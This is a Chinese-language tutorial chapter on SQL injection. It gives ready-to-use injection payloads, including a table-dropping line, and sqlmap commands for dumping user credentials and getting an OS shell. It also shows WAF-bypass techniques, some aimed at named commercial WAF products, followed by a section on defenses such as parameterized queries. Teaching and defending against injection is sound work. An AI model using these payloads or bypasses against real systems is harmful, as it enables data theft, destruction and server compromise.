# Chapter 2: SQL 注入

## 2.1 SQL 注入简介

SQL 注入是一种代码注入攻击，通过将恶意 SQL 语句插入到应用程序的输入参数中执行。

## 2.2 SQL 注入类型

### 2.2.1 基于错误的注入

通过触发数据库错误获取信息。

```sql
' OR 1=1 --
```

### 2.2.2 联合查询注入

使用 UNION 获取其他表的数据。

```sql
' UNION SELECT NULL,username,password FROM users--
```

### 2.2.3 布尔盲注

根据页面真假响应判断信息。

```sql
' AND 1=1 --
' AND 1=2 --
```

### 2.2.4 时间盲注

使用 SLEEP() 函数判断。

```sql
' AND IF(1=1,SLEEP(5),0)--
```

### 2.2.5 堆查询注入

执行多条 SQL 语句。

```sql
'; DROP TABLE users;--
```

## 2.3 SQLMap 详解

### 安装

```bash
# Kali 已预装
# 或通过 pip 安装
pip install sqlmap

# 使用
sqlmap -u "http://target.com/vuln.php?id=1"
```

### 常用命令

| 参数 | 说明 |
|------|------|
| `-u` | 指定目标 URL |
| `--dbs` | 列出所有数据库 |
| `--current-db` | 当前数据库 |
| `-D` | 指定数据库 |
| `--tables` | 列出表 |
| `-T` | 指定表 |
| `--columns` | 列出字段 |
| `-C` | 指定字段 |
| `--dump` | 导出数据 |
| `--batch` | 自动确认 |
| `--random-agent` | 随机 UA |
| `--proxy` | 使用代理 |
| `--level` | 测试等级 (1-5) |
| `--risk` | 风险等级 (1-3) |
| `--os-shell` | 获取系统 Shell |
| `--file-read` | 读取文件 |

### 实战案例

**1. 基础注入检测**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --batch
```

**2. 获取数据库**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --dbs
```

**3. 获取表名**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" -D webapp --tables
```

**4. 获取字段**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" -D webapp -T users --columns
```

**5. 导出数据**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" -D webapp -T users -C username,password --dump
```

**6. 获取 Shell**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --os-shell
```

**7. 使用代理**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --proxy=http://127.0.0.1:8080
```

**8. POST 注入**
```bash
# 抓包保存到文件
sqlmap -r request.txt --batch
```

**9. 绕过 WAF**
```bash
sqlmap -u "http://192.168.1.100/vuln.php?id=1" --tamper=space2comment,between
```

## 2.4 SQL 注入 Bypass WAF

### 2.4.1 编码绕过

**URL 编码：**
```
%27 OR 1=1 --
```

**Unicode 编码：**
```
' OR 1=1 --
' = 'a'='a
```

**Hex 编码：**
```
0x756e696f6e = union
```

**双重 URL 编码：**
```
%2527 = '
```

### 2.4.2 注释绕过

```sql
/**/UN/**/ION/**/SELECT/**/
```

### 2.4.3 大小写混合

```sql
UniOn SeLeCT
```

### 2.4.4 关键字替换

```sql
UNION ALL SELECT
UNION SELECT DISTINCT
```

### 2.4.5 内联注释

```sql
/*!UNION*/ /*!SELECT*/
```

### 2.4.6  tamper 脚本

SQLMap 内置 tamper 脚本：

```bash
# 空格替换为注释
sqlmap --tamper=space2comment

# 多个tamper组合
sqlmap --tamper=space2comment,between,randomcase
```

常用 tamper 脚本：

| 脚本 | 作用 |
|------|------|
| space2comment | 空格替换为 /**/ |
| space2dash | 空格替换为 -- |
| between | > 替换为 BETWEEN |
| charencode | 字符编码 |
| charunicodeencode | Unicode 编码 |
| equaltolike | = 替换为 LIKE |
| greatest | > 替换为 GREATEST |
| ifnull2ifisnull | IFNULL 替换 |
| space2mssqlblank | MSSQL 空格绕过 |

### 2.4.7 绕过案例

**案例 1：安全狗绕过**
```bash
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,randomcase --batch
```

**案例 2：D盾绕过**
```bash
sqlmap -u "http://target.com?id=1" --tamper=space2comment,charencode --batch
```

## 2.5 手动注入实战

### 2.5.1 判断注入点

```bash
# 添加单引号报错
http://target.com?id=1'

# 逻辑判断
http://target.com?id=1 and 1=1  # 正常
http://target.com?id=1 and 1=2  # 异常
```

### 2.5.2 判断字段数

```bash
order by 1--
order by 2--
# 直到报错为止
```

### 2.5.3 联合查询

```bash
union select 1,2,3,4--
```

### 2.5.4 获取数据库信息

```bash
# 版本
union select 1,version(),3,4--

# 数据库名
union select 1,database(),3,4--

# 用户
union select 1,user(),3,4--
```

## 2.6 SQL 注入防御

### 2.6.1 参数化查询（预编译）

**PHP：**
```php
// PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

// MySQLi
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

**Python：**
```python
# 使用参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (id,))
```

### 2.6.2 输入验证

```php
$id = filter_var($id, FILTER_VALIDATE_INT);
if (!$id) {
    die('Invalid input');
}
```

### 2.6.3 输出编码

```php
$output = htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8');
```

### 2.6.4 最小权限

```sql
-- 创建只读用户
CREATE USER 'reader'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON database.* TO 'reader'@'localhost';
```

### 2.6.5 Web 应用防火墙 (WAF)

使用 ModSecurity 等 WAF 防护。

### 2.6.6 防御总结

| 防御措施 | 说明 |
|----------|------|
| 参数化查询 | 最佳方案 |
| 输入验证 | 严格过滤 |
| 输出编码 | 防止 XSS |
| 最小权限 | 数据库账户 |
| WAF | 额外防护 |
| 定期审计 | 代码检查 |
